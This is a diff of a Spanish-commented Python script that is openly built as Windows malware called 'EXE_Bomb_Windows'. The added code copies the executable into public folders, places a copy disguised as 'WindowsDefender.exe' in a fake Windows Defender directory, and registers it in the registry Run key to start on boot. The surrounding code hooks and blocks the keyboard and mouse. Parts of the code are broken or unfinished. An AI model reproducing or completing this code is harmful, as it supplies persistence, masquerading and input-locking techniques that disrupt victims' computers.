@@ -6,6 +6,7 @@ import os
 from getpass import getuser 
 from multiprocessing import Process
 import threading
+import shutil
       
 def addStartup():  # function =  Iniciar automaticamente
     path = r"C:\Users\Public\Security\Windows Defender\EXE_Bomb_Windows.exe"        # Path del Software completo
@@ -24,7 +25,8 @@ def addStartup():  # function =  Iniciar automaticamente
     except: # Si no tien permisos de administrador
         if (verificar()):
             registry = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS) # local
-            SetValueEx(registry,name, 0, REG_SZ, path)          
+            SetValueEx(registry,name, 0, REG_SZ, path)
+                      
 def Block():    # Lib [KeyandMouse_Block]
     mouse = Controller()  
     def BlockMouse():
@@ -42,43 +44,104 @@ def Block():    # Lib [KeyandMouse_Block]
         k.KeyAll = e
         k.HookKeyboard()
         pythoncom.PumpMessages()    # Bloquea Teclado
-
+def CreateFileMain():
+        try:  # Intenta crear la dirección 
+            os.makedirs('C:\\Users\\Public\\EXEBombWindows\\Virus\\NoMeBorres')
+            return True
+        except:
+            return False
+        pass
 def ReplicateFile():  #Crea block de notas en el escritorio
-    def CreataDirectory():
-        try:  # Intenta crear la dirección
+    def CreataDirectories():
+        try:  # Intenta crear la dirección 
             os.makedirs('C:\\Users\\'+str(getuser())+'\\Desktop')
         except:
             pass
-    try:
-        log = os.environ.get( 'pylogger_file',os.path.expanduser('C:\\Users\\'+str(getuser())+'\\Desktop\\VirusBomb.exe'))
-        with open (log, "a") as v:
-            v.write("Virus Bomb...") #Escribe el Texto que irá dentro del ex  
-    except:
-        ReplicateFile()
+        try:  # Intenta crear la dirección 
+            os.makedirs('C:\\Users\\'+str(getuser())+'\\Documents')
+        except:
+            pass
+        try:  # Intenta crear la dirección 
+            os.makedirs('C:\\Users\\'+str(getuser())+'\\Music')
+        except:
+            pass
+        try:  # Intenta crear la dirección 
+            os.makedirs('C:\\Users\\'+str(getuser())+'\\Videos')
+        except:
+            pass
+        try:  # Intenta crear la dirección 
+            os.makedirs('C:\\Users\\'+str(getuser())+'\\Pictures')
+        except:
+            pass
+        try:  # Intenta crear la dirección 
+            os.makedirs('C:\\Users\\'+str(getuser())+'\\Downloads')
+        except:
+            pass
+        try:  # Intenta crear la dirección 
+            os.makedirs('C:\\Users\\'+str(getuser())+'\\AppData\\Roaming\\VirusBomb')
+        except:
+            pass
+        try:  # Intenta crear la dirección 
+            os.makedirs('C:\\Users\\'+str(getuser())+'\\AppData\\LocalLow\\VirusBomb')
+        except:
+            pass
+        try:  # Intenta crear la dirección 
+            os.makedirs('C:\\Users\\'+str(getuser())+'\\AppData\\Local\\VirusBomb')
+        except:
+            pass
+    
+    nameKey = "WindowsDefender.exe"
+    filePath = "C:\\Users\\Public\\Security\\Windows Defender\\"+ nameKey
+    
+    shutil.copy(nameKey , filePath)
         
         
 def saturar():
     pass
 
 
+    
+    
+    # si crear directorio es true , entonces cerrar, 
+    # si crear directorio es false
+    # continuar
+    return False
 
 
 
 if __name__ == '__main__':
-    #Block()                             # Bloquea Teclado y mouse
-    #addStartup()
-     # Hilos
-    h1= threading.Thread(target=CreateFiles)   # C
-    h1.start()
-    
-    
-    """
-    p1 = Process(target=a)     #  Inicia automaticamente
-    p2 = Process(target=B)          # 
-    p2.start()
-    p1.start()
-    """
-    
-    #p1.join()
-    #p2.join()
-
+    if (CreateFileMain()):  # Primer inicio
+        
+        #Replica 
+        try:
+            nameKey = "EXE_Bomb_Windows.exe"
+            filePath = 'C:\\Users\\Public\\EXEBombWindows\\Virus\\NoMeBorres'+ nameKey
+            shutil.copy(nameKey , filePath)
+            print("Se replico exitosamente")
+        except:
+            print("No se replicó")
+            
+        # Autoinicia en registro
+        addStartup()
+        print("se creó la carpeta y startup exitoso, virus deshabilitado")
+        exit()
+    else:                   # Segundo inicio
+        #Block()                             # Bloquea Teclado y mouse
+        #addStartup()
+        # Hilos
+        #h1= threading.Thread(target=ReplicateFile)   # C
+        #h1.start()
+        #h1.join()
+        
+        
+        """
+        p1 = Process(target=a)     #  Inicia automaticamente
+        p2 = Process(target=B)          # 
+        p2.start()
+        p1.start()
+        """
+        
+        #p1.join()
+        #p2.join()
+        print("la carpeta ya existe, virus en acción")
+        pass
